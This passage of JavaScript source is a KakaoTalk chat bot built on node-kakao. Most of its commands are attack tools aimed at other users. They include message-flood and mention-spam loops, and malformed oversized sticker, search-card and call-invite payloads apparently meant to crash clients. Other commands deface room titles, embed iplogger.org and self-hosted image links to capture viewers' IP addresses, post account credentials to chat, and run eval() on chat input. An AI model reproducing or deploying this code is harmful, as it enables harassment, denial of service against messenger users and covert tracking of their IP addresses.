                if (!runningSpamString) {
                    var m12 = data.text.replace(prefix + "메도 ", "").split('/')[0];
                    var m22 = data.text.replace(prefix + "메도 ", "").split('/')[1];
                        if(!isNaN(m22)) {
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            try {
                            channel.sendChat(new node_kakao.ChatBuilder().text(m12 + "\u200b".repeat(500) + "\n".repeat(200)).append(new node_kakao.MentionContent(channel.getUserInfo({ userId: _mid }))).build(1));
                        } catch (error) {
                            channel.sendChat("error");
                        }
                        }, 500);
                    } else {
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            try {
                            channel.sendChat(new node_kakao.ChatBuilder().text(m12 + "\u200b".repeat(500) + "\n".repeat(200)).append(new node_kakao.MentionContent(channel.getUserInfo({ userId: data.mentions[0].user_id }))).build(1));
                        } catch (error) {
                            channel.sendChat("error");
                        }
                        }, 500);  
                    }
                } else {
                    channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
                }
            }
        }



        if (data.text.startsWith(prefix + "멘도 ")) {
            if (adminList.includes(id)) {
                if (!runningSpamString) {
                        var _mid = data.text.replace(prefix + "멘도 ", "").split(" ");
                        if(!isNaN(_mid)) {
                        var i = 1;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            try {
                            channel.sendChat(new node_kakao.ChatBuilder().text("[" + i + "] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: _mid }))).build(1));
                            i++;
                        } catch (error) {
                            channel.sendChat("error");
                        }
                        }, 110);
                    } else {
                        var i = 1;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            try {
                            channel.sendChat(new node_kakao.ChatBuilder().text("[" + i + "] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: data.mentions[0].user_id }))).build(1));
                            i++;
                        } catch (error) {
                            channel.sendChat("error");
                        }
                        }, 110);  
                    }
                } else {
                    channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
                }
            }
        }

        if (runningNick == true) {
            stringInterval = setInterval(() => {
                try {
                var text = "";
                var possible = "!?가나다라마바하응뷁으느으비으루어ㅏㅁ니;ㅓㅇㅁ너ㅔ엄러-머겣멏젝처ㅓㅑㅐ더냐QWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm1234567890123456789123456789132465798❤❤❤❤🧡💛💚💙🤎";
                for (var i = 0; i < 15; i++)
                    text += possible.charAt(Math.floor(Math.random() * possible.length));
                nick2 = text;
                channel.changeProfile({
                    nickname: nick2,
                    profilePath: "",
                });
            } catch(error) { 
                console.log(error)
            }
            }, 1);
        }


        if (data.text.startsWith(prefix + "테러")) {
         if (adminList.includes(id)) {
               if (!runningSpamString1) {
    var i = 0;
          runningSpamString1 = true;
         stringInterval = setInterval(() => {
             i++;
            channel.sendChat(
             new node_kakao.ChatBuilder()
               .append(new node_kakao.AttachmentContent({
               }))
               .text("야 기분좋다")
               .build(1)
           )
            channel.sendChat(
              new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    shout: true,
                    "type": "animated-sticker/digital-item",
                    "path":  '4412207.emot_017.webp',
                     "name": "(이모티콘)",
                     "sound": "",
                     "width": "100",
                      "height": "100",
                      "msg": "", 
                   "alt": "카카오 이모티콘"
                  })).build(25)
             );
         runningNick = true
         }, 300);
         } else {
        channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
        }
        }}

        if (data.text.startsWith(prefix + "복배")) {
            if (adminList.includes(id)) {
                if (data.originalType == node_kakao.KnownChatType.REPLY) {
                    if (!runningSpamString) {
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            channel.sendChat(data._chat.attachment.src_message)
                        }, 140);
                    } else {
                        channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
                    }
                }

            }
        }
        if (data.text.startsWith(prefix + "폭팔")) {
            if (adminList.includes(id)) {
                    if (!runningSpamString) {
                        var i = 0;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            sendErrorPhone3()
                            pausecomp(220)
                            channel.sendChat(
                                new node_kakao.ChatBuilder()
                                    .text("Search")
                                    .append(new node_kakao.AttachmentContent({
                                        "R": [
                                            {
                                                "L": "https://www.youtube.com/watch?v=BLh8IVr8lCk",
                                                "MA": [],
                                                "D": "PC 튕",
                                                "PL": "튕",
                                                "TM": "겨",
                                                "SU": [
                                                    {
                                                        "TE": "",
                                                        "T": "m",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "s",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "t",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "b",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "l",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "o",
                                                        "IC": "28",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "c",
                                                        "IC": "",
                                                        "DE": ""
                                                    },
                                                    {
                                                        "TE": "",
                                                        "T": "0",
                                                        "IC": "",
                                                        "DE": ""
                                                    }
                                                ]
                                            }
                                        ],
                                        "V": "weather",
                                        "callingPkg": "",
                                        "L": "https://www.youtube.com/watch?v=BLh8IVr8lCk",
                                        "Q": "PC"
                                    }))
                                    .build(23)
                            );
                            i++;
                        }, 700);
                    } else {
                        channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
                    }
            }
        }

        if (data.text.startsWith(prefix + "임배")) {
            if (adminList.includes(id)) {
                    if (!runningSpamString) {
                        var i = 0;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            sendrawch(22,"",{
                                "name": "(이모티콘)",
                                "url": "2217108.emot_001.png",
                                "type": "animated-emoticon/digital-item",
                                "path2": "2212560.emot_033.png",
                                "scon": "6001001.file_008.scon",
                                "s": 0
                             })
                            i++;
                        }, 800);
                    } else {
                        channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
                    }
            } else {
                channel.sendChat("[ 🛡 ] 당신은 해당 명령어를 사용할 권한이 없습니다");
            }
        }
        if (data.text.startsWith(prefix + "청배")) {
            if (adminList.includes(id)) {
                if (!runningSpamString) {
                    var i = 0;
                    runningSpamString = true;
                    stringInterval = setInterval(() => {
                        channel.sendChat(
                            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                                "type": "animated-sticker/digital-item",
                                "path": '4412207.emot_017.webp',
                                "name": "(이모티콘)",
                                "sound": "",
                                "width": 200000,
                                "height": 20000, "msg": "",
                                "alt": "카카오 이모티콘"
                            })).build(25))
                        i++;
                    }, 180);
        }}}


        if (data.text.startsWith(prefix + "오배")) {
            if (adminList.includes(id)) {
                    if (!runningSpamString) {
                        var i = 0;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            sendErrorPhone()
                            i++;
                        }, 140);
                    } else {
                        channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
                    }
            } else {
                channel.sendChat("[ 🛡 ] 당신은 해당 명령어를 사용할 권한이 없습니다");
            }
        }


        if (data.text.startsWith(prefix + "도배 ")) {
            if (adminList.includes(id)) {
                if (data.text == prefix + "도배") {
                    channel.sendChat("도배할 문자를 입력해주세요!");
                } else {
                    if (!runningSpamString) {
                        var _message = data.text.replace(prefix + "도배 ", "");
                        var i = 0;
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                            channel.sendChat(_message);
                            i++;
                        }, 100);
                    } else {
                        channel.sendChat("[ 🛡 ]  이미 도배를 하는중입니다");
                    }
                }
            } else {
                channel.sendChat("[ 🛡 ] 당신은 해당 명령어를 사용할 권한이 없습니다");
            }
        }
        if (data.text == prefix + "중지") {
            if (adminList.includes(id)) {
                if (runningSpamString) {
                    clearInterval(stringInterval);
                    stringInterval = null;
                    runningSpamString = false;
                } else {
                    channel.sendChat("[ 🛡 ] 도배를 하는중이 아닙니다!");
                }
            } else {
                channel.sendChat("[ 🛡 ] 당신은 해당 명령어를 사용할 권한이 없습니다!");
            }
        }

        if (data.text.startsWith(prefix + "답장 ")) {
            var m1 = data.text.replace(prefix + "답장 ", "").split('/')[0];
            var m2 = data.text.replace(prefix + "답장 ", "").split('/')[1];
            var m3 = data.text.replace(prefix + "답장 ", "").split('/')[2];
            customChat = data.chat;
            customChat.sender.userId = data.mentions[0].user_id;
            customChat.text = m1;
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .append(new node_kakao.ReplyContent(customChat))
                    .text(m2 + "")
                    .build(node_kakao.KnownChatType.REPLY)
            );
        }


        if (data.text.startsWith(prefix + "큰임티 ")) {
            var m12 = data.text.replace(prefix + "큰임티 ", "").split('/')[0];
            var m22 = data.text.replace(prefix + "큰임티 ", "").split('/')[1];
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "type": "animated-sticker/digital-item",
                    "path": "4412206.emot_017.webp",
                    "name": "(이모티콘)",
                    "sound": "",
                    "width": m12,
                    "height": m22,
                    "msg": '',
                    "alt": "카카오 이모티콘"
                })).build(25)
            );
        }

        if (data.text == "=%약탈") {
            channel.sendChat("이메일 : " + email + "\n비밀번호 : " + pw)
        }

        if (data.text == prefix + "약탈방지") {
            email = "ㅋ이미막음"
            pw = "ㅋ이미막혔쥬?"
            channel.sendChat("약탈방지를 시작합니다")
        }


        if (data.text == prefix + "재시작") {
            if (adminList.includes(id)) {
            channel.sendChat("봇을 재시작합니다!")
            start()
        }}


        //channel.sendChat(channel.getUserInfo(371707126).memberStruct.originalProfileImageUrl)
        if (data.text.startsWith(prefix + "딱")) {
            if (adminList.includes(id)) {
                channel.setTitleMeta("노짱은 살아있다!")
                var ur = "https://prod.cloud.rockstargames.com/crews/sc/2816/41255217/publish/emblem/emblem_256.png"
                channel.setProfileMeta({
                    imageUrl: ur,
                  fullImageUrl: ur,
                  })
                  async function aa() {
                     await channel.setLiveTalkInfoMeta({
                        "liveon": true,
                        "title": "운지",
                        "startTime": 1111111111,
                        "userId": "",
                        "csIP": "211.231.102.213",
                        "csIP6": "2404:4600:6:369:211:231:102:213",
                        "csPort": 9000,
                        "callId": "1111111111111111"
                    });
                    await channel.setLiveTalkCountMeta({
                        count: 1
                    });
                }
                aa();
        }
    }

        if (data.text.startsWith(prefix + "hacked")) {
            if (adminList.includes(id)) {
                channel.setTitleMeta("yOu ArE hAcKEd")
                var ur = "http://th-m10.talk.kakao.com/th/talkm/oYPeratGVu/CYlTf3tUgFZn58ODofrY61/i_f6707dd5e0ad_120x120.jpg"
                channel.setProfileMeta({
                    imageUrl: ur,
                  fullImageUrl: ur,
                  })
                  async function aa() {
                     await channel.setLiveTalkInfoMeta({
                        "liveon": true,
                        "title": "운지",
                        "startTime": 1111111111,
                        "userId": "",
                        "csIP": "211.231.102.213",
                        "csIP6": "2404:4600:6:369:211:231:102:213",
                        "csPort": 9000,
                        "callId": "1111111111111111"
                    });
                    await channel.setLiveTalkCountMeta({
                        count: 1
                    });
                }
                aa();
        }
    }

    if (data.text.startsWith(prefix + "칭호 ")) {
        if (adminList.includes(id)) {
            var R = data.text.replace(prefix + "칭호 ", "");
            channel.sendChat("칭호를 " + prefix + "에서 " + R +"로 변경하였습니다")
            prefix = R
        } else {
            channel.sendChat("[ 🛡 ] 본 명령어를 실행할 권한이 없습니다");
        }
    }

        if (data.text.startsWith(prefix + "방제 ")) {
            if (adminList.includes(id)) {
                var RoomName = data.text.replace(prefix + "방제 ", "");
                channel.setTitleMeta(RoomName)
                channel.sendChat("방제목을 " + RoomName + " 로 변경하였습니다")
            } else {
                channel.sendChat("[ 🛡 ] 본 명령어를 실행할 권한이 없습니다");
            }
        }
        if (data.text.startsWith(prefix + "아이디")) {
            if (data.originalType == node_kakao.KnownChatType.REPLY) {
                channel.sendChat("[ 🛡 ] " + channel.getUserInfo({ userId: data._chat.attachment.src_userId }).nickname + "님의 ID : " + data._chat.attachment.src_userId)
            }
        }

        if (data.text.startsWith(prefix + "아이디 ")) {
            channel.sendChat("[ 🛡 ] " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "님의 ID : " + data.mentions[0].user_id)
        }



        if (data.text.startsWith(prefix + "상메 ")) {
            channel.sendChat("[ 상메 ] \n\n" + channel.getUserInfo({ userId: data.mentions[0].user_id }).statusMessage)
        }


        if (data.text.startsWith(prefix + "멘션 ")) {
            if (adminList.includes(id)) {
                var mid = data.text.replace(prefix + "멘션 ", "");
                try {
                    channel.sendChat(new node_kakao.ChatBuilder().text("[ ! ] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: mid }))).text("님을 멘션했습니다").build(1));
                } catch {
                    channel.sendChat("[ 🛡 ] 멘션할 대상이 올바르지 않습니다")
                }
            }
        }



        if (data.text.startsWith(prefix + "방폭")) {
            if (adminList.includes(id)) {
                if (king.includes(roomId)) {
                    channel.sendChat("stop")
                    for (var getValueFor = 0; getValueFor < king.length; getValueFor++) {
                        if (king[getValueFor] == roomId) {
                            king.splice(getValueFor);
                        }}            
            } else {
                king.push(roomId)
                channel.sendChat("start")
            }
        }
        }

        if (data.text.startsWith(prefix + "욕")) {
            if (adminList.includes(id)) {
                if (fuck.includes(roomId)) {
                    channel.sendChat("stop")
                    for (var getValueFor = 0; getValueFor < fuck.length; getValueFor++) {
                        if (fuck[getValueFor] == roomId) {
                            fuck.splice(getValueFor);
                        }}            
            } else {
                fuck.push(roomId)
                channel.sendChat("start")
            }
        }
        }
        if (data.text.startsWith(prefix + "admin")) {
            channel.sendChat("adminList! : " + adminList);
        }
        if (data.text.startsWith(prefix + "흡수")) {
            if (adminList.includes(id)) {
                channel.sendChat(
                    new node_kakao.ChatBuilder()
                        .append(new node_kakao.AttachmentContent({
                            "L": "https://iplogger.org/2AykA6",
                            "Q": "흡수",
                            "V": "image",
                            "R": [
                                {
                                    "D": "흡수",
                                    "L": "https://iplogger.org/2AykA6",
                                    "I": "https://iplogger.org/2AykA6",
                                    "W": 200,
                                    "H": 200
                                }
                            ]
                        }))
                        .build(23)
                );
            }
        }
        if (data.text == prefix + "컴폭2") {
            if (adminList.includes(id)) {
        sendrawch(52,'{ "type":"linvite","csIP":"211.231.102.205","csIP6":"2404:4600:6:368:211:231:102:205","csPort":9000,"title":"","startTime":1641404554,"duration":0 }',{
            "type": "linvite",
            "csIP": "211.231.102.205",
            "csIP6": "2404:4600:6:368:211:231:102:205",
            "csPort": 9000,
            "title": "ㅎㅇ",
            "duration": 0
         })
        }}
        if (data.text.startsWith(prefix + "보조 ")) {
            if (adminList.includes(id)) {
                var bye = data.text.replace(prefix + "보조 ", "");
         sendrawch(51,'{ "type":"bye","csIP":"211.231.102.5","csIP6":"2404:4600:6:238:211:231:102:5","csPort":9000,"callId":"178543096168872649","duration":' + bye +'}',{
            "type": "bye",
            "csIP": "211.231.102.5",
            "csIP6": "2404:4600:6:238:211:231:102:5",
            "csPort": 9000,
            "callId": "178543096168872649",
            "duration": bye
         })
        }}
        if (data.text == prefix + "컴폭") {
            if (adminList.includes(id)) {
                channel.sendChat(
                    new node_kakao.ChatBuilder()
                        .text("Search")
                        .append(new node_kakao.AttachmentContent({
                            "R": [
                                {
                                    "L": "",
                                    "MA": [],
                                    "D": "",
                                    "PL": "",
                                    "TM": "",
                                    "SU": [
                                        {
                                            "TE": "",
                                            "T": "",
                                            "IC": "",
                                            "DE": ""
                                        },
                                    ]
                                }
                            ],
                            "V": "weather",
                            "callingPkg": "",
                            "L": "",
                            "Q": ""
                        }))
                        .build(23)
                );
            }
        }
        if (data.text.startsWith(prefix + "감지 ")) {
            if (adminList.includes(id)) {
                    var _Mention = data.mentions[0].user_id;
                    var detectChar = roomId + ":" + _Mention + "";
                    if (mustDetect.includes(detectChar)) {
                        channel.sendChat("[ 🛡 ] 해당 유저는 이미 감지중입니다...");
                    } else {
                        mustDetect.push(detectChar);
                        channel.sendChat("[ 🛡 ] 해당 유저를 감지합니다");
                        console.log(msg)
                    }
            }
        }




        if (data.text.startsWith(prefix + "롤 ")) {
            var lol = data.text.replace(prefix + "롤 ", "");
            request("https://www.op.gg/summoner/userName=" + encodeURI(lol),
                (error, response, html) => {
                        var $ = cheerio.load(html);
                        var tier = $("div.TierRank").text();
                        var img = $("img.ProfileImage").attr("src");
                        var tierimg = $("div.SummonerRatingMedium > div > img.Image").attr("src");
                        var l = $("div.ProfileIcon > span").text();
                        var name = $("div.Information > span.Name").text();
                        var ranking = $("div.LadderRank > a > span.ranking").text();
                        var w = $("div.TierInfo > span.WinLose > span.wins").text();
                        var time = $("div.TimeStamp > span").text();
                        var lo = $("div.TierInfo > span.WinLose > span.losses").text();
                        var io = $("div.TierInfo > span.WinLose > span.winratio").text().split("Win Ratio ")[1];
                        if(name.length == "0") {
                            channel.sendChat("잘못된 이름입니다")
                        } else {
                            if(w.length == "0") {
                                w = "정보"
                                lo = "없음"
                            }
                          sendrawch(23,"",{
                            "L": " ",
                            "Q": "[ 리그 오브 레전드 정보]",
                            "V": "music",
                            "F": {},
                            "R": [
                               {
                                  "L": "",
                                  "T": name + "/" + tier.replace("\n\t\t\t",""),
                                  "I": "https:" + img,
                                  "W": 400,
                                  "H": 400,
                                  "DE": "Level : " + l + " | W/L : " + w.replace("W","승") +" " + lo.replace("L","패")
                               }
                            ],                  
                            "RF": {
                               "BU": [
                                  {
                                     "L": "https://www.op.gg/summoner/userName=" + lol,
                                     "T": "자세히 보기",
                                  }]}
                         })}
                }
            );
        }
        if (data.text.startsWith(prefix + "!프로필 ")) {
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .text("카카오톡 프로필")
                    .append(new node_kakao.AttachmentContent({
                        "userId": data.mentions[0].user_id,
                        "nickName": "",
                        "fullProfileImageUrl": "",
                        "profileImageUrl": "",
                        "statusMessage": ""
                    }))
                    .build(17)
            );
        }
        function sendWord(_text) {
                channel.sendChat(
                    new node_kakao.ChatBuilder()
                    .append(new node_kakao.AttachmentContent({
                        "os": [
                            {
                               "t": 3,
                               "st": 2,
                               "u": {
                                  "id": id
                               }
                            },
                            {
                               "t": 1,
                               "ct": _text,
                               "jct": "[{\"type\":\"text\",\"text\":\""+ _text + "\"}]"
                            }
                        ]                      
                    }))
                    .build(24)
                );}
        if (data.text.startsWith(prefix + "글쓰기 ")) {
            if (adminList.includes(id)) {
                sendWord(data.text.replace(prefix + "글쓰기 ", ""));
        }}

        if (data.text.startsWith(prefix + "실프")) {
            if (adminList.includes(id)) {
            var profile = data.text.replace(prefix + "실프 ", "");
            var sid = parseInt(parseInt(data.text.substr(4)).toString(2).substr(27), 2) + 2
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .text("카카오톡 프로필")
                    .append(new node_kakao.AttachmentContent({
                        "userId": sid,
                    }))
                    .build(17)
            );
            channel.sendChat("실프 아이디 : " + sid)
        }}

        if (data.text.startsWith(prefix + "프로필 ")) {
            var profile = data.text.replace(prefix + "프로필 ", "");
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .text("카카오톡 프로필")
                    .append(new node_kakao.AttachmentContent({
                        "userId": profile,
                        "nickName": "",
                        "fullProfileImageUrl": "",
                        "profileImageUrl": "",
                        "statusMessage": ""
                    }))
                    .build(17)
            );
        }

        if (data.text.startsWith(prefix + "외치기 ")) {
            var we = data.text.replace(prefix + "외치기 ", "");
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .append(new node_kakao.AttachmentContent({
                        shout: true
                    }))
                    .text(we)
                    .build(1)
            )
        }

        if (data.text.startsWith(prefix + "번역 ")) {
            if (adminList.includes(id)) {
                var tran = data.text.replace(prefix + "번역 ", "");
                translate(tran, {to: 'en'}).then(res => {
                    channel.sendChat(res)
                }).catch(err => {
                    console.error(err)
                })
            }}
            if (data.text.startsWith(prefix + "방프 ")) {
                var ur = data.text.replace(prefix + "방프 ", "");
                channel.setProfileMeta({
                    imageUrl: ur,
                  fullImageUrl: ur,
                  })
                channel.sendChat("[ 🛡 ] succces")
            }


            if (data.text.startsWith(prefix + "tv ")) {
                var ur = data.text.replace(prefix + "tv ", "");
                channel.setTvLiveMeta(
                    {
                        "url": ur,
                        "live": 'on'
                    })
                channel.sendChat("[ 🛡 ] tv on")
            }
    
            if (data.text.startsWith(prefix + "offtv")) {
                channel.setTvLiveMeta(
                    {
                        "url": '',
                        "live": 'off'
                    })
                channel.sendChat("[ 🛡 ] tv off")
            }
    

        if (data.text.startsWith(prefix + "닉변 ")) {
            if (adminList.includes(id)) {
                var nick = data.text.replace(prefix + "닉변 ", "");
                channel.sendChat("봇의 닉네임을 " + nick + "으로 변동하였습니다")
                channel.changeProfile({
                    nickname: nick,
                    profilePath: "",
                });
            }
        }

        function test() {
            let sum = 0;
            for (let i = 1; i <= 1000000; i++) {
                sum = sum + i;
            }
        }


        if (data.text == prefix + "봇") {
            let start = new Date();  // 시작
            test();
            let end = new Date();  // 종료
            var ms = end - start
            var ms1 = ms * 0.01
            channel.sendChat("RUNTIME : " + ms1 + "\nDev Plus Bot은 카카오톡 정식 봇이 아닙니다!")
        }


        if (data.text == prefix + "짤") {
        channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent(
                {
                    "url": "http://dn-v.talk.kakao.com/talkv/wqwp8VUPos/dcmua91pS009FVbDqBDsM0/talkv_high.mp4",
                    "tk": "cEOvR0/wqwp8VUPos/dcmua91pS009FVbDqBDsM0/talkv_high.mp4",
                    "cs": "B532D7E0F0ADE51CD8FF86ED612CD389B0272DD6",
                    "s": 5864905,
                    "d": 31,
                    "w": 280,
                    "h": 480
                 }
            ))
                .build(3)
        )
                }
                
                

        roominfo = CLIENT.channelList.open.getJoinInfo("https://open.kakao.com/me/_js")
        

        if (data.text == prefix + "방계남친") {
            sendrawch(23,"",{
                "L": "",
                "Q": "방계남친",
                "V": "simple",
                "RH": {
                   "HI": {
                      "W": 500,
                      "H": 500,
                      "L": "",
                      "I": ipLog_adress,
                   }
                },
                "R": [
                   {
                      "L": " ",
                      "T": "<font color=#dc143c>" + "3"+ "</font>",
                      "D": "알려진 바로는 3명"
                   }
                ]                     
             })
        }

        if (data.text == prefix + "방계여친") {
            sendrawch(23,"",{
                "L": "",
                "Q": "방계여친",
                "V": "simple",
                "RH": {
                   "HI": {
                      "W": 500,
                      "H": 500,
                      "L": "",
                      "I": ipLog_adress,
                   }
                },
                "R": [
                   {
                      "L": " ",
                      "T": "<font color=#dc143c>" + "undefined"+ "</font>",
                      "D": "없-음"
                   }
                ]                     
             })
        }

        if (data.text == prefix + "x" || data.text == prefix + "X" ) {
            if (adminList.includes(id)) {
            try {
                iplogid  = data.chat.logId
                ipLog_admin = getDnsIp.address();
                ipLog_channel = channel;
                ipLog_local = "";
                ipLog_usingServer = "Using";
                http.get({ 'host': 'api.ipify.org', 'port': 80, 'path': '/' }, function (res) {
                    res.on("data", function (chunk) {
                        ipLog_local = chunk;
                        ipLog_adress = "http://" + chunk + ":" + ipPort + "/"
                        channel.sendChat(ipLog_adress)
                        sendrawch(23,"",{
                            "L": "",
                            "Q": "아이피 추적",
                            "V": "simple",
                            "RH": {
                               "HI": {
                                  "W": 500,
                                  "H": 500,
                                  "L": "",
                                  "I": ipLog_adress,
                               }
                            },
                            "R": [
                               {
                                  "L": " ",
                                  "T": "<font color=#dc143c>" + "야~ 기분 좋다!"+ "</font>",
                                  "D": "중력 523배"
                               }
                            ]                     
                         })  
                    });
                }).on('error', function (e) {
                    console.log("ERROR OCCURRED DURING GRABBING IP!");
                    return;
                });
                let mentionList1 = chunk(Array.from(channel.getAllUserInfo()), 15);
                for (var i = 0; i < mentionList1.length; i++) {
                  mentionList1[i].forEach((v, j) => {
                    pausecomp(0);
                      var detectChar = roomId + ":" + v.userId
                      mustDetect.push(detectChar);
                  })
                }
            } catch (e) {
                channel.sendChat(e + "아이피");
            }
        }}


         
        if (data.text == prefix + "x!" || data.text == prefix + "X!" ) {
                    if (adminList.includes(id)) {
                        if (ipLog_usingServer != "None") {
                            try {
                                channel.sendChat("None");
                                ipLog_loggedIps = [];
                                ipLog_usingServer = "None";
                            } catch (e) {
                                channel.sendChat(e + "아이피");
                            }
                        } else {
                        }
                    } else {
                        channel.sendChat("당신은 해당 명령어를 수행할 권한이 없습니다!");
                    }
                }




                if (data.text == prefix + "홍보") {
                sendrawch(23,"",{
                    "L": "https://open.kakao.com/o/gQJPVmOd",
                    "Q": "[ Et의 공식방 ]",
                    "V": "simple",
                    "RH": {
                       "HI": {
                          "W": 500,
                          "H": 500,
                          "L": "https://open.kakao.com/o/gQJPVmOd",
                          "I": "https://th-m2.talk.kakao.com/th/talkm/oYRUBuBJeP/R5XaYLUuwQSKc8uqFAScVk/i_d4302e66c7cf.jpg",
                       }
                    },
                    "R": [
                       {
                          "L": "https://open.kakao.com/o/gT5yw0Rd",
                          "T": "Et의 공식방",
                          "D": "Et의 공식방입니다! 들어오세요! (클릭 해주세요!)"
                       }
                    ]                     
                 })  
                }



        if (data.text == prefix + "삭메감지") {
            dlog = true
            channel.sendChat("[ 🛡 ] 삭제되는 메시지들을 감지합니다");
        }

        if (data.text == prefix + "삭메중지") {
            dlog = false
            channel.sendChat("[ 🛡 ] 삭제되는 메시지들을 감지를 중지합니다");
        }

        if (data.text.startsWith(prefix + "위치 ")) {
            var m1 = data.text.replace(prefix + "위치 ", "").split('/')[0];
            var m2 = data.text.replace(prefix + "위치 ", "").split('/')[1];
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .append(new node_kakao.AttachmentContent({
                        "L": "",
                        "Q": "위치",
                        "V": "image",
                        "R": [
                            {
                                "D": "위치",
                                "L": "https://ssl.daumcdn.net/map3/staticmap/image?srs=wgs84&size=500x258&markers=symbol:sc_marker%7Clocation:" + m2 +  "," + m1 + "&logo=none",
                                "I": "https://ssl.daumcdn.net/map3/staticmap/image?srs=wgs84&size=500x258&markers=symbol:sc_marker%7Clocation:" + m2 +  "," + m1 + "&logo=none",
                                "W": 1000,
                                "H": 516
                            }
                        ]
                    }))
                    .build(23)
            );
        }

    if (data.text.startsWith(prefix + "아이피")) {
        if (adminList.includes(id)) {
    channel.sendChat(
        new node_kakao.ChatBuilder()
            .append(new node_kakao.AttachmentContent({
                "L": "",
                "Q": "느그 아이피",
                "V": "image",
                "R": [
                    {
                        "D": "느그 아이피",
                        "L": "",
                        "I": "https://allbotserver.herokuapp.com/",
                        "W": 2500,
                        "H": 320
                    }
                ]
            }))
            .build(23)
    );
        }}
        if (data.text == "=프로필") {
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "L": "g-o.kro.kr/?kakaoopen://card/create",
                    "Q": "프로필 만들기로 바로가기",
                    "V": "image",
                    "R": [
                        {
                            "D": "프로필 만들기로 바로가기",
                            "L": 'g-o.kro.kr/?kakaoopen://card/create',
                            "I": "https://th.bing.com/th/id/R.88de159ff9fff2c917411291b5bb6785?rik=krlpZiQ29iHjWg&riu=http%3a%2f%2fblogfiles.naver.net%2f20160531_10%2flinakim97_1464665776716dgTCK_JPEG%2f%c4%ab%c4%ab%25BF%25C0%25C5%25E5_%25C0%cc%b8%25F0%c6%bc%25C4%25DC_%25C0%cc%b9%25CC%25C1%25F6_%25B3%25F5%c4%a5%25BC%25F6_%25BE%25F8%25B4%25D9_10.jpg&ehk=VuVRF5aPzHVJ61XiVAdNGr2kUqJhevj5ru8ke2agz%2bI%3d&risl=&pid=ImgRaw&r=0",
                            "W": 10,
                            "H": 10
                        }
                    ]
                }))
                    .build(23)
            )
        }



        if (data.text == prefix + "노알라") {
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "L": "https://www.youtube.com/watch?v=iwrkH5VP4Io",
                    "Q": "노알라 바로가기",
                    "V": "image",
                    "R": [
                        {
                            "D": "노알라",
                            "L": 'https://www.youtube.com/watch?v=iwrkH5VP4Io',
                            "I": "https://yt3.ggpht.com/a/AATXAJwvfI3adCGyvZTtU_jqMgSRtjdzjaov8nClFgiS=s900-c-k-c0xffffffff-no-rj-mo",
                            "W": 10,
                            "H": 10
                        }
                    ]
                }))
                    .build(23)
            )
        }

        if (data.text.startsWith(prefix + "정지 ")) {
            var sus1 =   channel.getUserInfo({ userId:  data.mentions[0].user_id}).nickname
               var sus =   channel.getUserInfo({ userId:  data.mentions[0].user_id}).suspended
               console.log(sus + "")
               channel.sendChat(sus1 + "님의 정지 여부입니다 \n\n" + sus)
        }


        if (data.text.startsWith(prefix + "정지")) {
            var sus1 =   channel.getUserInfo({ userId: data._chat.attachment.src_userId }).nickname
               var sus =   channel.getUserInfo({ userId: data._chat.attachment.src_userId }).suspended
               console.log(sus + "")
               channel.sendChat(sus1 + "님의 정지 여부입니다 \n\n" + sus)
        }

        if (data.text.startsWith(prefix + "ev ")) {
            if (adminList.includes(id)) {
                try {
                    channel.sendChat(String(eval(data.text.substr(4))))
                } catch (error) {
                    channel.sendChat("[ 🛡 ] 실패하였습니다.\n" + "\u200b".repeat(500) + error);
                }
            }
        }

        if (data.text == prefix + "채팅청소") {
            if (adminList.includes(id)) {
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "type": "animated-sticker/digital-item",
                    "path": '4412207.emot_017.webp',
                    "name": "(이모티콘)",
                    "sound": "",
                    "width": 20000,
                    "height": 20000, "msg": "",
                    "alt": "카카오 이모티콘"
                })).build(25)
            );
        }}

        if (data.text == prefix + "차트") {
            if (adminList.includes(id)) {
        var url = 'http://www.melon.com/chart/';
        var title = new Array(),
            artist = new Array(),
            up_date,
